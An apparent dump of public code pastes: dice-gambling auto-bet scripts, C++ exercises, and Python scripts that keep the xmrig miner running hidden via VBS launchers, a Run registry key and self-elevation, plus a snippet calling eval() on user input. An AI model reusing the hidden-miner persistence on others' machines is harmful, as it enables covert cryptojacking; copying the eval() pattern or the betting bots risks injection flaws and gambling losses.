id,title,username,language,date,content
6fA8vAet,snowybot,coinwalk,JavaScript,Monday 20th of November 2023 01:48:27 AM CDT,"var originalbal = parseFloat(document.getElementById('pct_balance').value);
var base = (0.0001*1).toFixed(8);
var floatingbase = base;
var taget = (originalbal*3);
var groupedten = (base*10);
var groupedseven = (base*6.9);
var groupedeight = (base*7.5);
var tobetnext = ((floatingbase*1).toFixed(8));
var bolance = originalbal;
var amen = ((Math.floor(originalbal/groupedten))*groupedten);
var fart = 0;
var upper =  6.9;
var downer = 2.9;
 
function get(){
console.clear();
bolance = document.getElementById('pct_balance').value;
if (bolance>(amen+(floatingbase*upper))){
    floatingbase = floatingbase*2;
    fart = fart+1;
    upper =  4.9;
    downer = 4.9;
    amen = parseFloat(bolance);
}
if (bolance<(amen-(floatingbase*downer))){
    floatingbase = floatingbase*2;
    fart = fart+1;
    upper =  4.9;
    downer = 4.9;
    amen = parseFloat(bolance);
}
if ((fart>=2)&&(bolance<(((Math.floor(bolance/groupedten))*groupedten)+groupedseven))){
    floatingbase = base;
    fart = 0;
    upper =  6.9;
    downer = 2.9;
    amen = ((Math.floor(bolance/groupedten))*groupedten);
}
    if (bolance >= taget) {
        console.log(""winner winner chicken dinner"");
        return;
    }
tobetnext = (floatingbase*1).toFixed(8);
$('#pct_chance').val(49.5);
$('#pct_bet').val(tobetnext);
$('#a_lo').click();
var good = ((bolance-originalbal).toFixed(8));
console.log(""profit"");
console.log(good);
setTimeout(() => get(), 1000);
}
get();"
5fVeHRVS,xmrig_unreg.py,Thunder-Menu,Python,Monday 20th of November 2023 01:30:15 AM CDT,"import os
import getpass
import winreg as reg

def get_current_username():
    return getpass.getuser()

def remove_from_startup(username, key_name):
    key_path = r""Software\Microsoft\Windows\CurrentVersion\Run""

    try:
        key = reg.HKEY_CURRENT_USER
        reg_key = reg.OpenKey(key, key_path, 0, reg.KEY_ALL_ACCESS)
        reg.DeleteValue(reg_key, key_name)
        reg.CloseKey(reg_key)
        print(f""Key '{key_name}' removed from startup registry for user '{username}'."")
    except FileNotFoundError:
        print(f""Key '{key_name}' not found in the registry for user '{username}'."")
    except Exception as e:
        print(f""Error removing '{key_name}' from startup registry for user '{username}': {e}"")

if __name__ == ""__main__"":
    username = get_current_username()
    key_name = ""xmrig_checker_"" + username
    remove_from_startup(username, key_name)

#https://pastebin.com/jumpXUw1
#https://pastebin.com/ZTFeTGpr
#https://pastebin.com/5r65viYW
#https://pastebin.com/GWphQhH4
#https://pastebin.com/5fVeHRVS
#https://autofaucet.org/dashboard/mining#command-line
#pyinstaller --onefile xmrig_invisible.py
#https://raw.githubusercontent.com/3xploitch3ats/Thunder-Menu/tm/xmrig_Invisible.py
#https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/xmrig_invisible.exe
#https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/xmrig_common.exe
#https://raw.githubusercontent.com/3xploitch3ats/Thunder-Menu/tm/xmrig_common.py
#https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/xmrig_check.exe
#https://raw.githubusercontent.com/3xploitch3ats/Thunder-Menu/tm/xmrig_check.py
#https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/xmrig_stop.exe
#https://raw.githubusercontent.com/3xploitch3ats/Thunder-Menu/tm/xmrig_Stop.py
#https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/xmrig_unreg.exe
#https://raw.githubusercontent.com/3xploitch3ats/Thunder-Menu/tm/xmrig_unreg.py
#https://github.com/xmrig/xmrig/releases/tag/v5.8.1
#https://github.com/xmrig/xmrig/releases/download/v5.8.1/xmrig-5.8.1-msvc-cuda10_1-win64.zip"
5r65viYW,xmrig_check.py,Thunder-Menu,Python,Monday 20th of November 2023 01:20:43 AM CDT,"import os
import subprocess
import requests
import getpass
import winreg as reg
import ctypes
import sys

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def check_process(process_name):
    try:
        result = subprocess.run([""tasklist"", ""/NH"", ""/FI"", f'IMAGENAME eq {process_name}'], capture_output=True, text=True, check=True)
        return process_name in result.stdout
    except subprocess.CalledProcessError:
        return False

def add_to_startup(file_path):
    username = getpass.getuser()
    key = r""Software\Microsoft\Windows\CurrentVersion\Run""
    key_path = r""Software\Microsoft\Windows\CurrentVersion\Run""

    try:
        key = reg.HKEY_CURRENT_USER
        key_value = f""xmrig_checker_{username}""
        reg_key = reg.OpenKey(key, key_path, 0, reg.KEY_ALL_ACCESS)
        reg.SetValueEx(reg_key, key_value, 0, reg.REG_SZ, file_path)
        reg.CloseKey(reg_key)
        print(""Added to startup registry."")
    except Exception as e:
        print(f""Error adding to startup registry: {e}"")

if __name__ == ""__main__"":
    exe_name = ""xmrig.exe""
    xmrig_path = r""C:\Program Files\Common Files\xmrig""
    
    if not os.path.exists(xmrig_path):
        os.makedirs(xmrig_path)

    startup_file_path = os.path.join(xmrig_path, ""xmrig_check.bat"")
    check_startup_file_path = os.path.join(xmrig_path, ""check_xmrig.bat"")
    vbs_file_path = os.path.join(xmrig_path, ""xmrig_check.vbs"")

    check_xmrig_content = f""""""@echo off
    :Check
    timeout /T 60
    tasklist /NH /FI ""IMAGENAME eq {exe_name}"" | find /i ""{exe_name}"" > nul
    if errorlevel 1 (
        cd /d ""{xmrig_path}""
        start /b {exe_name}
    )
    goto Check
    """"""

    with open(startup_file_path, 'w') as file:
        file.write(check_xmrig_content)

    check_xmrig = f""""""@echo off
cd %~dp0 && start """" xmrig_check.vbs && exit
    """"""

    with open(check_startup_file_path, 'w') as file1:
        file1.write(check_xmrig)

    add_to_startup(check_startup_file_path)

    vbs_content = f""""""Set objShell = CreateObject(""WScript.Shell"")
objShell.Run ""cmd.exe /C xmrig_check.bat"", 0, True
Set objShell = Nothing
""""""

    with open(vbs_file_path, 'w') as file2:
        file2.write(vbs_content)

    if is_admin():
        subprocess.Popen(f'start cmd /c ""{check_startup_file_path}""')
        print(""Task started in a new console window."")
    else:
        ctypes.windll.shell32.ShellExecuteW(None, ""runas"", sys.executable, f'""{os.path.abspath(__file__)}""', None, 1)

    while True:
        if not check_process(exe_name):
            print(f""{exe_name} is Not Running. Starting..."")
            try:
                subprocess.Popen(f'start /MIN cmd /c ""{check_startup_file_path}""', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            except subprocess.CalledProcessError as e:
                print(f""Error starting {exe_name}: {e}"")
        else:
            print(f""{exe_name} is running"")

#https://pastebin.com/jumpXUw1
#https://pastebin.com/ZTFeTGpr
#https://pastebin.com/5r65viYW
#https://pastebin.com/GWphQhH4
#https://pastebin.com/5fVeHRVS
#https://autofaucet.org/dashboard/mining#command-line
#pyinstaller --onefile xmrig_invisible.py
#https://raw.githubusercontent.com/3xploitch3ats/Thunder-Menu/tm/xmrig_Invisible.py
#https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/xmrig_invisible.exe
#https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/xmrig_common.exe
#https://raw.githubusercontent.com/3xploitch3ats/Thunder-Menu/tm/xmrig_common.py
#https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/xmrig_check.exe
#https://raw.githubusercontent.com/3xploitch3ats/Thunder-Menu/tm/xmrig_check.py
#https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/xmrig_stop.exe
#https://raw.githubusercontent.com/3xploitch3ats/Thunder-Menu/tm/xmrig_Stop.py
#https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/xmrig_unreg.exe
#https://raw.githubusercontent.com/3xploitch3ats/Thunder-Menu/tm/xmrig_unreg.py
#https://github.com/xmrig/xmrig/releases/tag/v5.8.1
#https://github.com/xmrig/xmrig/releases/download/v5.8.1/xmrig-5.8.1-msvc-cuda10_1-win64.zip"
5JsD9auJ,teza9-sub3-2,madidino,C++,Monday 20th of November 2023 01:20:34 AM CDT,"#include <iostream>
#include <cstring>
using namespace std;
char cc[31];
void fnd(char c[])
{
    for(int i=0; i<=strlen(c); i++)
    {
        if(strchr(""aeiou"",c[i]))
        {
            strcpy(cc,c+i);
        }
    }
}
int main()
{
    char s[260];
    char crt[31];
    cin.getline(s,260);
    //cin.ignore();
    cin>>crt;
    fnd(crt);
    strcpy(crt,cc);
    cout<<cc<<endl;

    char *p;
    p=strtok(s,"" "");
    char crt2[30];
    while(p)
    {
        strcpy(crt2,p);
        fnd(crt2);
        strcpy(crt2,cc);
        if(strcmp(crt2,crt)==0)
        {
            cout<<p<<endl;
        }
        p=strtok(NULL,"" "");
    }

    return 0;
}
"
ysEg3r2G,teza9-sub3-1,madidino,C++,Monday 20th of November 2023 01:20:03 AM CDT,"#include <iostream>

using namespace std;
int circular(int a,int b)
{
    int nr=a;
    int p=1;
    int k=0;
    while(nr)
    {
        k++;
        p*=10;
        nr=nr/10;
    }
    p/=10;
    for(int i=1; i<=k; i++)
    {
        if(a==b)
        {
            return i-1;
        }
        else
        {
            int x=a%10;
            a=x*p+a/10;
        }
    }
    return -1;
}
int main()
{
    cout<<circular(120362,621203);
    return 0;
}
"
g98MiZQs,snowybot 100fold,coinwalk,JavaScript,Monday 20th of November 2023 01:15:36 AM CDT,"var originalbal = parseFloat(document.getElementById('pct_balance').value);
var base = (originalbal/8000).toFixed(8);
var floatingbase = base;
var taget = (originalbal*24);
var groupedten = (base*10);
var groupedseven = (base*6.9);
var groupedeight = (base*7.5);
var tobetnext = ((floatingbase*1).toFixed(8));
var bolance = originalbal;
var amen = ((Math.floor(originalbal/groupedten))*groupedten);
var fart = 0;
var upper =  6.9;
var downer = 2.9;
 
function get(){
console.clear();
bolance = document.getElementById('pct_balance').value;
if (bolance>(amen+(floatingbase*upper))){
    floatingbase = floatingbase*2;
    fart = fart+1;
    upper =  4.9;
    downer = 4.9;
    amen = parseFloat(bolance);
}
if (bolance<(amen-(floatingbase*downer))){
    floatingbase = floatingbase*2;
    fart = fart+1;
    upper =  4.9;
    downer = 4.9;
    amen = parseFloat(bolance);
}
if ((fart>=3)&&(bolance<(((Math.floor(bolance/groupedten))*groupedten)+groupedseven))){
    floatingbase = base;
    fart = 0;
    upper =  6.9;
    downer = 2.9;
    amen = ((Math.floor(bolance/groupedten))*groupedten);
}
    if (bolance >= taget) {
        console.log(""winner winner chicken dinner"");
        return;
    }
tobetnext = (floatingbase*1).toFixed(8);
$('#pct_chance').val(49.5);
$('#pct_bet').val(tobetnext);
$('#a_lo').click();
var good = ((bolance-originalbal).toFixed(8));
console.log(""profit"");
console.log(good);
setTimeout(() => get(), 1);
}
get();"
7QsNmVp3,original snowybot,coinwalk,JavaScript,Monday 20th of November 2023 01:14:57 AM CDT,"var originalbal = parseFloat(document.getElementById('pct_balance').value);
var base = (originalbal/80).toFixed(8);
var floatingbase = base;
var taget = (originalbal*24);
var groupedten = (base*10);
var groupedseven = (base*6.9);
var groupedeight = (base*7.5);
var tobetnext = ((floatingbase*1).toFixed(8));
var bolance = originalbal;
var amen = ((Math.floor(originalbal/groupedten))*groupedten);
var fart = 0;
var upper =  6.9;
var downer = 2.9;
 
function get(){
console.clear();
bolance = document.getElementById('pct_balance').value;
if (bolance>(amen+(floatingbase*upper))){
    floatingbase = floatingbase*2;
    fart = fart+1;
    upper =  4.9;
    downer = 4.9;
    amen = parseFloat(bolance);
}
if (bolance<(amen-(floatingbase*downer))){
    floatingbase = floatingbase*2;
    fart = fart+1;
    upper =  4.9;
    downer = 4.9;
    amen = parseFloat(bolance);
}
if ((fart>=3)&&(bolance<(((Math.floor(bolance/groupedten))*groupedten)+groupedseven))){
    floatingbase = base;
    fart = 0;
    upper =  6.9;
    downer = 2.9;
    amen = ((Math.floor(bolance/groupedten))*groupedten);
}
    if (bolance >= taget) {
        console.log(""winner winner chicken dinner"");
        return;
    }
tobetnext = (floatingbase*1).toFixed(8);
$('#pct_chance').val(49.5);
$('#pct_bet').val(tobetnext);
$('#a_lo').click();
var good = ((bolance-originalbal).toFixed(8));
console.log(""profit"");
console.log(good);
setTimeout(() => get(), 1);
}
get();"
7HwBn7mY,СПРИНТ № 4 | Жизненный цикл объекта | Урок 4: Список инициализации конструктора,chevengur,C++,Monday 20th of November 2023 01:07:26 AM CDT,"#include <numeric>

using namespace std;

class Rational {
public:
    Rational() = default;

    Rational(int numerator): numerator_(numerator), denominator_(1) {
    }

    Rational(int numerator, int denominator): numerator_(numerator), denominator_(denominator){
        Normalize();
    }

    int Numerator() const {
        return numerator_;
    }

    int Denominator() const {
        return denominator_;
    }

private:
    void Normalize() {
        if (denominator_ < 0) {
            numerator_ = -numerator_;
            denominator_ = -denominator_;
        }
        const int divisor = gcd(numerator_, denominator_);
        numerator_ /= divisor;
        denominator_ /= divisor;
    }

    int numerator_ = 0;
    int denominator_ = 1;
};"
60WWjHL3,ok unleashed snowy manual 8000 divide originally 80divide,coinwalk,JavaScript,Monday 20th of November 2023 12:57:17 AM CDT,"var originalbal = parseFloat(document.getElementById('pct_balance').value);
var base = (originalbal/8000).toFixed(8);
var floatingbase = base;
var taget = (originalbal*24);
var groupedten = (base*10);
var groupedseven = (base*6.9);
var groupedeight = (base*7.5);
var tobetnext = ((floatingbase*1).toFixed(8));
var bolance = originalbal;
var amen = 0;
var fart = 0;
 
function get(){
console.clear();
bolance = document.getElementById('pct_balance').value;
if ((bolance>(((Math.floor(bolance/groupedten))*groupedten)+groupedseven))&&(bolance<(((Math.floor(bolance/groupedten))*groupedten)+groupedeight))&&(bolance!=amen)){
    floatingbase = floatingbase*2;
    fart = fart+1;
    amen = parseFloat(bolance);
}
if ((fart>=3)&&(bolance<(((Math.floor(bolance/groupedten))*groupedten)+groupedseven))){
    floatingbase = base;
    fart = 0;
    amen = 0;
}
    if (bolance >= taget) {
        console.log(""winner winner chicken dinner"");
        return;
    }
tobetnext = (floatingbase*1).toFixed(8);
$('#pct_chance').val(49.5);
$('#pct_bet').val(tobetnext);
$('#a_lo').click();
var good = ((bolance-originalbal).toFixed(8));
console.log(""profit"");
console.log(good);
setTimeout(() => get(), 1);
}
get();
"
UvmQCqWY,task-1,cloud_clown,Python,Sunday 19th of November 2023 11:20:48 PM CDT,"from time import ctime
from timeit import Timer
from math import sqrt

def getNonNegativeInt(prompt):
    while True:
        try:
            user_input = input(prompt)
            if user_input == """":
                raise ValueError(""Missing input"")
            value = eval(user_input)
            if not isinstance(value, int):
                raise ValueError(f""{user_input} is not an integer"")
            if value < 0:
                raise ValueError(f""{value} must not be negative"")
            return value
        except Exception as e:
            print(f""Invalid input: {e}"")

def computeXcoordinates(width, intervals):
